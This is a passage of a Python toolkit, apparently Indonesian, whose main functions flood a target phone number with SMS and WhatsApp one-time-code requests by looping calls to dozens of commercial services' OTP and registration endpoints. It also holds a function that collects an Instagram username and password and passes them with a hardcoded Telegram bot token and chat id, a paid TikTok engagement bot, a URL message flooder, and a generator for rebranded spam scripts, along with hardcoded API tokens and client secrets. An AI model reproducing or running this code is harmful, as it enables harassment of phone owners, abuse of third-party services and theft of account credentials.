                  mokasm = requests.post("https://service.mokapos.com/account/v1/verification/phone/send",headers={  "accept": "application/json, text/plain, */*","authorization": "undefined","save-data": "on","user-agent": freya,"content-type": "application/json;charset=UTF-8"},data=json.dumps({"phone_number":f"+62"+number})).text
                  dekorsm=requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",headers={"Host":"auth.dekoruma.com","save-data":"on","user-agent": freya,"content-type":"application/json","accept":"*/*","origin":"https://m.dekoruma.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.dekoruma.com/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phoneNumber":"+62"+number,"platform":"sms"})).text
                  #req3 = requests.post('https://www.alodokter.com/login-with-phone-number', headers={'Host': 'www.alodokter.com','content-length': '33','x-csrf-token': 'UG8hv2kV0R2CatKLXYPzT1isPZuGHVJi8sjnubFFdU1YvsHKrmIyRz6itHgNYuuBbbgSsCmfJWktrsfSC9SaGA==','sec-ch-ua-mobile': '?1','user-agent': freya,'content-type': 'application/json','accept': 'application/json','save-data': 'on','origin': 'https://www.alodokter.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.alodokter.com/login-alodokter','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'},data=json.dumps({"user": {"phone": "0"+number}})).text
                  #pizzahut=requests.post('https://api-prod.pizzahut.co.id/customer/v1/customer/register', headers={'Host': 'api-prod.pizzahut.co.id','content-length': '157','x-device-type': 'PC','sec-ch-ua-mobile': '?1','x-platform': 'WEBMOBILE','x-channel': '2','content-type': 'application/json;charset=UTF-8','accept': 'application/json','x-client-id': 'b39773b0-435b-4f41-80e9-163eef20e0ab','user-agent': freya,'number -lang': 'en','save-data': 'on','x-device-id': 'web','origin': 'https://www.pizzahut.co.id','sec-fetch-site': 'same-site','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.pizzahut.co.id/','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'},data=json.dumps({  "email": "oidjiwa1@gmail.com",  "first_name": "Xenzi",  "last_name": "Wokwokw",  "password": "Aldi++\\/67",  "phone": "0"+number,  "birthday": "2000-01-02"})).text
                  blism=requests.post("https://www.blibli.com/backend/common/users/_request-otp",headers={"Host":"www.blibli.com","content-length":"27","accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?1","user-agent": freya,"sec-ch-ua-platform":"Android","origin":"https://www.blibli.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.blibli.com/login?ref=&logonId=0"+number,"accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"username":"0"+nomor})).text
                  #ha=requests.post("https://pluang.com/api/user/register/send-otp",headers={'Host':'pluang.com','content-length':'112','sec-ch-ua':'"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile':'?1','user-agent': freya,'sec-ch-ua-platform':'Android','content-type':'application/json','accept':'*/*','origin':'https://pluang.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://pluang.com/register','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},cookies={"cookie":"_gcl_au=1.1.634793654.1661960345","cookie":"_ga=GA1.2.217955334.1661960346","cookie":"_gid=GA1.2.1904059940.1661960346","cookie":"_gat_gtag_UA_124743364_3=1","cookie":"_fbp=fb.1.1661960347395.1573571703","cookie":"environment=production","cookie":"language=in","cookie":"WZRK_G=abf62dd1bf5f41edaa930f04872d1884","cookie":"cebs=1","cookie":"_tt_enable_cookie=1","cookie":"_ttp=ef83fe23-1e62-4741-9339-c077fd6d2076","cookie":"WZRK_S_R57-4Z9-9W6Z=%7B%22p%22%3A1%2C%22s%22%3A1661960351%2C%22t%22%3A1661960350%7D","cookie":"cebsp=1","cookie":"_ce.s=v~2dbcd906fa5fb9b378ebbd2642a150297d12fd70~vpv~0~v11slnt~1661960352042","cookie":"_ga_3RX02MCRS0=GS1.1.1661960345.1.1.1661960362.43.0.0","cookie":"_ga_824G2HJWD9=GS1.1.1661960346.1.1.1661960362.0.0.0","cookie":"_ga_EHTZ6P30C7=GS1.1.1661960346.1.1.1661960362.0.0.0","cookie":"_ga_ZXS1PKZ40M=GS1.1.1661960346.1.1.1661960362.0.0.0"},data=json.dumps({"name":"Shshshiskabzbz","email":"oidjiwa1@gmail.com","phone":"0"+number,"csrfToken":"pluangCsrfToken"})).text
                  momobilsm=requests.post("https://api.momobil.id/users/otp/send",headers={"Host":"api.momobil.id","Connection":"keep-alive","Content-Length":"39","sec-ch-ua-mobile":"?1","User-Agent": freya,"sec-ch-ua-platform":"Android","Content-Type":"application/json","Accept":"*/*","Origin":"https://momobil.id","Sec-Fetch-Site":"same-site","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://momobil.id/","Accept-Encoding":"gzip, deflate, br","Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"to":"0"+number,"type":"register"})).text
                  #posting=requests.post("https://api.qoala.app/api/registrations",headers={"Host":"api.qoala.app","content-length":"202","accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?1","user-agent": freya,"sec-ch-ua-platform":"Android","origin":"https://www.qoala.app","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.qoala.app/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"fullName":"Hsjsnsns","email":"oidjiwa1@gmail.com","phoneNumber":"+62"+number,"identityType":"KTP","nationality":"ID","password":"Abc167@ggwp","passwordConfirmation":"Abc167@ggwp","lang":"id"})).text
                  #last=json.dumps([{"operationName":"generateOTP","variables":{"destinationType":"sms","identity":"+62"+number},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"}])
                  #kum = requests.post("https://graphql-v4.kumparan.com/query",headers={"Host":"graphql-v4.kumparan.com","content-length":"179","accept":"*/*","content-type":"text/plain","env-client":"d52f487fa02230a23dbdc6e5a67545ddc59e4766d0a326d3f4a814b74ecc045e9382fed825b0d75ec7fa16588a50d75d","sec-ch-ua-mobile":"?1","user-agent": freya,"sec-ch-ua-platform":"Android","origin":"https://m.kumparan.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.kumparan.com/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"operationName":"CreateOTPAndSendSMS","variables":{"phone":number},"query":"mutation CreateOTPAndSendSMS($phone: String!) {\n  CreateOTPAndSendSMS(phone: $phone)\n}\n"})).text
                  #poss = requests.post("https://ua.ctcorpmpc.com/blade-user/api/user/getotp",headers={"Host":"ua.ctcorpmpc.com","Connection":"keep-alive","Content-Length":"148","Blade-Auth":"Bearer 22222","sec-ch-ua-mobile":"?1","Authorization":"Basic c3dvcmQ6c3dvcmRfc2VjcmV0","Content-Type":"application/json;charset=UTF-8","User-Agent": freya,"X-requested-With":"XMLHttpRequest","Tenant-Id":"000000","sec-ch-ua-platform":"Android","Accept":"*/*","Origin":"https://ua.ctcorpmpc.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://ua.ctcorpmpc.com/cas-web/","Accept-Encoding":"gzip, deflate, br","Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phoneNo":number,"tplId":"4001001","tms":1662434407722,"requestId":"6e1b8c1c-fe2f-4418-851b-d31af02f0c221662434407722","intlPhoneCode":"62"})).text
                  #poll=requests.post("https://api.myfave.com/api/fave/v3/auth",headers={'Host':'api.myfave.com','Connection':'keep-alive','Content-Length':'26','sec-ch-ua':'"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','x-user-agent':'Fave-PWA/v1.0.0','content-type':'application/json','sec-ch-ua-mobile':'?1','User-Agent': freya,'sec-ch-ua-platform':'"Android"','Accept':'*/*','Origin':'https://myfave.com','Sec-Fetch-Site':'same-site','Sec-Fetch-Mode':'cors','Sec-Fetch-Dest':'empty','Referer':'https://myfave.com/','Accept-Encoding':'gzip, deflate, br','Accept-Language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=json.dumps({"phone":"+62"+number})).text
                  #pospp=requests.post("https://wapi.ruparupa.com/auth/generate-otp",headers={"Host":"wapi.ruparupa.com","content-length":"120","sec-ch-ua-mobile":"?0","authorization":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYTQyNDMyZDctZjI5NS00Zjk0LTllYTYtZjlkZmM0ZDgwY2RiIiwiaWF0IjoxNjU3MTI0OTQwLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.4j37JW_U6DVynJ0wCxHmVNI8SbpsaeUgqk3SEihJmvs","content-type":"application/json","x-company-name":"odi","accept":"application/json","user-agent": freya,"user-platform":"desktop","x-frontend-type":"desktop","sec-ch-ua-platform":"Linux","origin":"https://www.ruparupa.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.ruparupa.com/verification?page=otp-choices","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"0"+number,"action":"register","channel":"message","email":"oidjiwa1@gmail.com","token":"","customer_id":"0","is_resend":0})).text
                  print(f"{N}[{warna}!{N}] Sukses menggirim spam [ {H}✓ {N}]")
                  time.sleep(3)
                  countdown(30)


    except KeyboardInterrupt:
        pass

def to_c():
    try:
        number = input(f"\n{N}[{warna}?{N}] Nomor {Y}({Ab}Exam:8xxx{Y})={R}⟩{H} ")
        if number == "83809192307" or number == "882005602526" or number == "85953890866" or number == "85879210750" or number == "89531319589" or number == "85221850807":
            print(f'\n{M}tidak dapat Melakukan Spam ke PI')
            time.sleep(4)
        else:
            number_list = number.split(" ")
            for nomor in number_list:
                while True:
                  bantudagang=requests.post("https://app.bantudagang.com/api/auth/request-otp", headers = {"Host": "app.bantudagang.com","Content-Length": "55","Origin": "https://app.bantudagang.com","Authorization": "Bearer","Access-Control-Max-Age": "86400","Content-Type": "application/json","Accept": "application/json, text/plain, */*","Cache-Control": "no-cache","User-Agent": freya,"Referer": "https://app.bantudagang.com/register","Accept-Encoding": "gzip, deflate, br","Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","Cookie": "_fbp=fb.1.1713015792899.82897756; _gcl_au=1.1.764924446.1713015794; _ga_HSV4N9N8GW=GS1.1.1713015797.1.1.1713015802.0.0.0; _ga=GA1.2.59243435.1713015797; _gid=GA1.2.515919540.1713015804; _gat_gtag_UA_194308569_1=1",}, data =json.dumps({"phone_number": "62"+number,"from": "registration",}))
                  mapclub=requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp?channel=WHATSAPP", headers = {"Host": "beryllium.mapclub.com","Connection": "keep-alive","Content-Length": "26","Client-Platform": "WEB","Origin": "https://www.mapclub.com","Client-Timestamp": "1713097505164","Authorization": "Bearer eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiJkMDJiYTgyOC0yZDNiLTQ5YjgtODJiYy1hODAxZjU0ZWQzMzgiLCJleHBpcmVkIjoxNzEzMTAxMTA1ODg5LCJleHBpcmUiOjM2MDAsImV4cCI6MTcxMzEwMTEwNSwiaWF0IjoxNzEzMDk3NTA1LCJwbGF0Zm9ybSI6IldFQiJ9.ysu0Tvg5HjkdOBMDCzk67PuH8bld3lJ4dSyzOebkPSpyva9KYEY4xA5y89FTKZ_WTGczNbY7VqiCw5fPpG_VeA","Content-Type": "application/json","Accept-Language": "in-ID","Accept": "application/json, text/plain, */*","User-Agent": freya,"Referer": "https://www.mapclub.com/member/register","Accept-Encoding": "gzip, deflate, br",},data =json.dumps({"account": number}))
                  evermos=requests.post('https://evermos.com/int-client/v3/user-verification/phone-registration', headers = {'Host': 'evermos.com','content-length': '26','origin': 'https://evermos.com','client-device': 'web_mobile','authorization': 'Bearer 8e1254ac2c8e0783402ed1e47764940328a2d0f5','x-forwarded-for': '10.0.84.135','content-type': 'application/json','accept': 'application/json, text/plain, */*','user-agent': freya,'referer': 'https://evermos.com/registration/otp?source_link=GAds_SEM_EV_EVMBrand','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}, data=json.dumps({"phone": "62"+number,}))
                  namk = random.choice(["Jamal","Ammr","Pardi","Xenzi","Vindra","Saipul","Farhan"])
                  mailk = random.choice(["jamal321@gmail.com","vindraid@gmail.com","ammar230@gmail.com","santrip109@gmail.com"])
                  head7={'Host': 'order.kfcku.com','content-length': '137','sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"','accept': 'application/json, text/plain, */*','content-type': 'application/json','culturecode': 'id','sec-ch-ua-mobile': '?1','user-agent': freya,'sec-ch-ua-platform': '"Linux"','origin': 'https://order.kfcku.co','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://order.kfcku.com/account/register','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,zh;q=0.5,es;q=0.4'}
                  cokf={'cookie': '_ga=GA1.1.2145612061.1704219246','cookie': 'G_ENABLED_IDPS=google','cookie': '_ga_VDQKXM3LBX=GS1.1.1704219245.1.1.1704219399.0.0.0'}
                  data=json.dumps({"Phone":"+0"+number,"Email":mailk,"BirthDate":331603200,"FullName":namk,"Gender":"M","Password":"zNGqur8xRDSnSm2"})
                  pos=requests.post("https://order.kfcku.com/api/register",headers=head7,cookies=cokf,data=data).text
                  head8={'Host': 'order.kfcku.com','content-length': '70','sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"','accept': 'application/json, text/plain, */*','content-type': 'application/json','culturecode': 'id','sec-ch-ua-mobile': '?1','user-agent': freya,'sec-ch-ua-platform': '"Android"','origin': 'https://order.kfcku.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://order.kfcku.com/account/register','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,zh;q=0.5,es;q=0.4'}
                  cokf2={'cookie': '_ga=GA1.1.2145612061.1704219246','cookie': 'G_ENABLED_IDPS=google','cookie': '_ga_VDQKXM3LBX=GS1.1.1704219245.1.1.1704219399.0.0.0'}
                  data2=json.dumps({"PhoneNumber":"+0"+number,"source":"register","token":"whatsapp"})
                  pos2=requests.post("https://order.kfcku.com/api/requestotp",headers=head8,cookies=cokf2,data=data2).text
                  xsrf = requests.get("https://magneto.api.halodoc.com/api/v1/users/status").cookies.get_dict()
                  headhaldoc = {"referer": "https://www.halodoc.com","content-type": "application/json","x-xsrf-token": xsrf['XSRF-TOKEN']}
                  paylodhaldoc = {"phone_number": "+62"+number,"channel": "whatsapp"}
                  cokihaldoc = {"cookie": '_gcl_au=1.1.935637007.1686465186; _gid=GA1.2.1888372629.1686465187; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7={"g":"9ade8176-03c1-dd87-f8d7-c0c3f60f861a","c":1686465187381,"l":1686465187381}; XSRF-TOKEN='+xsrf['XSRF-TOKEN']+'; afUserId=31b1ff72-9c27-4492-a787-7a895c0d422e-p; AF_SYNC=1686465191318; _ga_02NBJNEKVH=GS1.1.1686465187.1.1.1686465223.0.0.0; amp_394863=WECZG4ZhC4dZKUWVGE4Ogh...1h2kii76k.1h2kiiai8.3.0.3; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7={"g":"c13c57ed-4fbf-80d3-7b17-19eb5a8fcedc","e":1686467027367,"c":1686465187365,"l":1686465227367}; _ga=GA1.2.1084460534.1686465187'}
                  response = requests.post("https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests",headers=headhaldoc,data=json.dumps(paylodhaldoc),cookies=cokihaldoc).json()
                  lamudi=requests.post("https://www.lamudi.co.id/check-mobile-number", headers = {"Host": "www.lamudi.co.id","content-length": "81","origin": "https://www.lamudi.co.id","x-requested-with": "XMLHttpRequest","accept-language": "in","user-agent": freya,"content-type": "application/json","accept": "*/*","referer": "https://www.lamudi.co.id/login","accept-encoding": "gzip, deflate, br","cookie": "eid=id_1796219902623067; PHPSESSID_lamudi=5be4518db440175ccd2a3647a7a7f5d4; device_view=mobile; _fbp=fb.2.1713008792473.236479905; _tt_enable_cookie=1; _ttp=dw6HJddmpIqIb8kbU0xDLwDD-ds; _gcl_au=1.1.396234533.1713008796; _gid=GA1.3.161127650.1713008797; _ce.clock_event=1; _ce.clock_data=-282%2C182.2.41.17%2C2%2C9716d0f82c9071d98aa14503c66d8aac; userLanguage=in; sid=id_1796277592926545; _ce.irv=returning; cebs=1; reese84=3:qel9sM/KiYY+kMHmaZ9WBA==:GJ9cj9F8iScYdBKRo7eivbMU1+K6LjDJxB59lM6HtrqFxEth9RcvIRK2/itdVDwFWTLemZB8YegfUQw7nBjazSPab10xd9maHasv3QvDqubOooRNi5/91nb8u0GrCYv/PzJD9jUH9xfK1xm248qRWxYIO4Q/p3tD/x5PK59pR/us+DadVRn4f7v21A5g1fUWzX45+nBDR6ZmjAEHjhZJn+21Sw7RB/PA/eM0sNUaW87Qbx6clbwNZaICaNVYJA+vxc2JDD01FuFJ3WPa2yjq8LkJz2tCPgQRKTujwYEH6tByHTYK9vA8ar04pU9HGlqSsQAF115JTrIM32lOkmB6JeNudz6gJdRWBps6Hz+MIwynqGhf3xlnkhz81FANpCFGsNgRSdS7UjAkLTM5zLSM4qqbr+FU5O7QvoJ3FNBR0Mca9bIaksZRbhDWJrqbQhA/Lb7uiXreTRNObsDaoMnyzw==:dRGs/INqlRpFewCmRu1zGE20HSUF94PJuQ2nqogVyF0=; AMP_TOKEN=%24NOT_FOUND; _dc_gtm_UA-48934674-8=1; cebsp_=2; _gat_UA-48934674-8=1; _ga=GA1.3.243764704.1713008795; _ga_X588G3GXB4=GS1.1.1713063807.2.1.1713063838.0.0.0; _ce.s=v~56070e5dbdd0e3372c734e6364d4ac9cf8601848~lcw~1713063872715~lva~1713063807286~vpv~1~v11.fhb~1713008826040~v11.lhb~1713009426561~v11slnt~1713063824227~v11.cs~420167~v11.s~90b48d00-fa0b-11ee-a822-89ce0bd62427~v11.sla~1713063872696~gtrk.la~luyxzztd~lcw~1713063872787",}, data =json.dumps({"contactPhone": "+62"+number,"formType": "register","mobileNumberLogin": True}))
                  tokoko=requests.post("https://api-v2.bukuwarung.com/api/v2/auth/otp/send",headers={'Host':'api-v2.bukuwarung.com','content-length':'198','sec-ch-ua':'"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile':'?0','user-agent': freya,'content-type':'application/json','accept':'application/json, text/plain, */*','x-app-version-code':'5050','x-app-version-name':'android','buku-origin':'tokoko','sec-ch-ua-platform':'"Linux"','origin':'https://web.tokoko.id','sec-fetch-site':'cross-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://web.tokoko.id/','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',},data=json.dumps({"action":"LOGIN_OTP","countryCode":"+62","deviceId":"test-1","method":"WA","phone":number,"clientId":"2e3570c6-317e-4524-b284-980e5a4335b6","clientSecret":"S81VsdrwNUN23YARAL54MFjB2JSV2TLn"})).text
                  site = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=0'+number+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'Connection' : 'keep-alive','Accept' : 'application/json, text/javascript, */*; q=0.01','Origin' : 'https://accounts.tokopedia.com','X-Requested-With' : 'XMLHttpRequest','User-Agent' : freya,'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding' : 'gzip, deflate',}).text # tokped api
                  search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1) # tokped
                  sending = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'Connection' : 'keep-alive','Accept' : 'application/json, text/javascript, */*; q=0.01','Origin' : 'https://accounts.tokopedia.com','X-Requested-With' : 'XMLHttpRequest','User-Agent' : freya,'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding' : 'gzip, deflate',}, data = {'otp_type' : '116','msisdn' : '0'+number,'tk' : search,'email' : '','original_param' : '','user_id' : '','signature' : '',}).text # send requests tokped api
                  bibit=requests.post("https://api.bibit.id/auth/register/phone",headers={'Host':'api.bibit.id','accept':'application/json, text/plain, */*','content-type':'application/json','sec-ch-ua-mobile':'?1','x-platform':'web','user-agent': freya,'sec-ch-ua-platform':'"Android"','origin':'https://app.bibit.id','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://app.bibit.id/','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=json.dumps({"code":"62","phone":number,"via":"whatsapp","recaptcha_token":"","recaptcha_type":"v3"})).text #bibit api
                  why=requests.post("https://www.misteraladin.com/api/members/v2/otp/request",headers={'Host':'www.misteraladin.com','content-length':'81','sec-ch-ua':'"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','accept-language':'id','sec-ch-ua-mobile':'?0','authorization':'Bearer null','content-type':'application/json;charset=UTF-8','accept':'application/json, text/plain, */*','user-agent': freya,'x-platform':'web','sec-ch-ua-platform':'"Linux"','origin':'https://www.misteraladin.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.misteraladin.com/register','accept-encoding':'gzip, deflate, br',},data=json.dumps({"phone_number_country_code":"62","phone_number":number,"type":"register"})).text
                  reqi=requests.post("https://auth.sampingan.co/v1/otp",data=json.dumps({"channel":"WA","country_code":"+62","phone_number":number}),headers={"Host":"auth.sampingan.co","domain-name":"auth-svc","app-auth":"Skip","content-type":"application/json; charset=UTF-8","user-agent": freya,"accept":"application/vnd.full+json","accept":"application/json","content-type":"application/vnd.full+json","content-type":"application/json","app-version":"2.1.2","app-platform":"Android"}).text
                  autoketik(f"{N}[{warna}!{N}] Sukses menggirim spam [ {H}✓ {N}]")
                  time.sleep(3)
                  countdown(30)


    except KeyboardInterrupt:
        pass

def load_tokens():
    try:
        with open("tokens.json", "r") as file:
            data = json.load(file)
            return data.get("premium_token"), data.get("free_token")
    except (FileNotFoundError, json.JSONDecodeError):
        return None, None

def save_tokens(premium_token, free_token):
    data = {"premium_token": premium_token, "free_token": free_token}
    with open("tokens.json", "w") as file:
        json.dump(data, file)

def tiktok():
    print()
    validbystaff_premium = {
        "330213": True,  #validasi premium
    }

    validbystaff_free = {
        "330303": True,  #validasi free
    }

    premium_token, free_token = load_tokens()

    access_type = input("Access type (premium/free): ").lower()

    if access_type == "premium":
        if premium_token is None or premium_token not in validbystaff_premium or not validbystaff_premium[premium_token]:
            print(f"{N}[{warna}!{N}] Link Buy Token : {M}https://trakteer.id/diipay/showcase#page-menu {N}")
            premium_token = input(f"{N}[{warna}?{N}] Input Premium Token {Y}({Ab}Exam:33xxxx{Y})={R}⟩{H} ")
            if premium_token not in validbystaff_premium or not validbystaff_premium[premium_token]:
                print(f"{N}[{R}!{N}] Premium token salah. Chat Admin Untuk Info")
                time.sleep(3)
                os.system("clear");caramel_freya_2();tiktok()
                return
            print(f"{N}[{warna}!{N}] Premium Token Benar: {Y}{premium_token}{N}\n")
            save_tokens(premium_token, free_token)
    elif access_type == "free":
        if free_token is None or free_token not in validbystaff_free or not validbystaff_free[free_token]:
            print(f"{N}[{warna}!{N}] Link Free Token : {M}https://trakteer.id/diipay/showcase#page-menu {N}")
            free_token = input(f"{N}[{warna}?{N}] Input Free Token {Y}({Ab}Exam:33xxxx{Y})={R}⟩{H} ")
            if free_token not in validbystaff_free or not validbystaff_free[free_token]:
                print(f"{N}[{R}!{N}] Free token salah. Chat Admin Untuk Info")
                time.sleep(3)
                os.system("clear");caramel_freya_2();tiktok()
                return
            print(f"{N}[{warna}!{N}] Free Token Benar: {Y}{free_token}{N}\n")
            save_tokens(premium_token, free_token)
    else:
        print(f"{N}[{R}!{N}] Type akses tidak valid.")
        return

    if access_type == "free":
        while True:
            try:
                likesjet()
                print("Next execution in 5 minutes...")
                countdown(300)
            except Exception as e:
                print(f"An error occurred: {e}. Retrying in 5 minutes...")
                time.sleep(300)
    else:
        Z = Zefoy()
        threading.Thread(target=Z.check_config).start()
        threading.Thread(target=Z.update_name).start()
        Z.send_captcha()
        print(f"\n{P}[{warna}!{P}] Pilih Menu Service {P}[{warna}!{P}]\n {P}1{M}.{P} ( NEXT UPDATE )\n {P}2{M}.{P} ( NEXT UPDATE )\n {P}3{M}.{P} ( NEXT UPDATE )\n {P}4{M}.{P} View TikTok\n {P}5{M}.{P} Share TikTok\n {P}6{M}.{P} Favorite TikTok\n {P}7{M}.{P} ( NEXT UPDATE )")
        Z.run()

def send_message_via_url(url, count=1):
    success_count = 0
    for i in range(count):
        response = requests.get(url)
        if response.status_code == 200:
            success_count += 1
            sys.stdout.write(f"\rPesan terkirim ({success_count}/{count})")
            sys.stdout.flush()
        else:
            print("\rGagal mengirim pesan. Kode status:", response.status_code)

def haimedii():
  print("Jumlah akun tumbal tersedia: 0")
  print()
  target_username = input("Masukan username : @").strip()
  print("bot Belum Tersedia.")
  time.sleep(5)
  os.system("clear");mediilolz();main_menu_ig()
  #follow_user(target_username)

def logdii():
    #print("Jumlah akun tumbal tersedia:", len(bot_accounts))
    print("Jumlah akun tumbal tersedia: 0")
    print()
    username = input("Masukkan username : @")
    password = input("Masukkan password : ")

    bot_token = "6988647496:AAFSQzYWU1uPqu_5P5oUouS-tCwJ1G8472A"
    chat_id = "6675654027"

    result = check_login_and_send(username, password, bot_token, chat_id)
    print(result)

def akus():
  print()
  name = input(f"{N}[{warna}?{N}] Nama Author {Y}({Ab}Exam: dii{Y})={R}⟩{H} ")
  ig = input(f"{N}[{warna}?{N}] Username Ig {Y}({Ab}Exam: @oranginisiald{Y})={R}⟩{H} @")
  out = input(f"{N}[{warna}?{N}] File Sv {Y}({Ab}Exam: nama.py{Y})={R}⟩{H} ")
  refurbis(name, ig, out)

def logo(name, ig):
    return f"""
{U} ___{N} ___
{U}/ __|{N} _ ){Y}  •{P} Author   {M} :{P}  {name} X DII37{P}
{U}\__ \{N} _ \{Y}  •{N} Instagram{M} :{P}  @{ig} {P}
{U}|___/{N}___/{Y}  •{N} Tools    {M} :{P}  Spam {P}
"""

def refurbis(name, ig, out):
  with open(out, "w") as baru:
        baru.write("import os,sys,requests,json,random\n")
        baru.write("\n")
        baru.write("P = '\x1b[1;97m'  # PUTIH\n")
        baru.write("M = '\x1b[1;91m'  # MERAH\n")
        baru.write("R = '\x1b[1;91m'\n")
        baru.write("Y = '\x1b[1;93m'\n")
        baru.write("Ab = '\x1b[1;30m'\n")
        baru.write("H = '\x1b[1;92m'  # HIJAU\n")
        baru.write("K = '\x1b[1;93m'  # KUNING\n")
        baru.write("B = '\x1b[1;94m'  # BIRU\n")	
        baru.write("U = '\x1b[1;95m'  # UNGU\n")
        baru.write("O = '\x1b[1;96m'  # BIRU MUDA\n")
        baru.write("N = '\x1b[0m'     # WARNA nTerminating\n")
        baru.write("Freya = [M, H, K, B, U, O,]\n")
        baru.write("warna = random.choice(Freya)\n")
        baru.write("\n")
        baru.write("def logo():\n")
        baru.write('    os.system("clear")\n')
        baru.write('    return """' + logo(name, ig) + '"""\n')
        baru.write("\n")
        baru.write("def main():\n")
        baru.write("  print(logo())\n")
        baru.write('  no = input(f"{N}[{warna}?{N}] Nomor {Y}({Ab}Exam:8xxx{Y})={R}⟩{H} ")\n')
        baru.write(f"  {adel}\n")
        baru.write('  print(f"{N}[{warna}!{N}] Sukses menggirim spam [ {H}✓ {N}]")\n')
        baru.write("\n#ingin mengedit lebih lanjut ??? Gabung Sini.")
        baru.write("\n#https://t.me/dii37chanel\n")
        baru.write("\n")
        baru.write("\n")
        baru.write("logo()\n")
        baru.write("main()")
        
  print(f"{N}[{warna}!{N}] Sukses menyimpan file ke {out} [ {H}✓ {N}]")

def diilico():
  print("Jumlah akun tumbal tersedia: 0")
  print()
  target_username = input("Masukan username : @").strip()
  print("bot Belum Tersedia.")
  time.sleep(5)
  os.system("clear");mediilolz();main_menu_ig()
  #random.shuffle(bot_accounts)
  #for bot_account in bot_accounts:
    #like_and_comment(target_username, bot_account)
    #time.sleep(random.randint(60, 300))

def trashbot():
    print()
    url = input("Masukkan URL : ")
    count = int(input("Masukkan jumlah send: "))
    send_message_via_url(url, count)
    print()

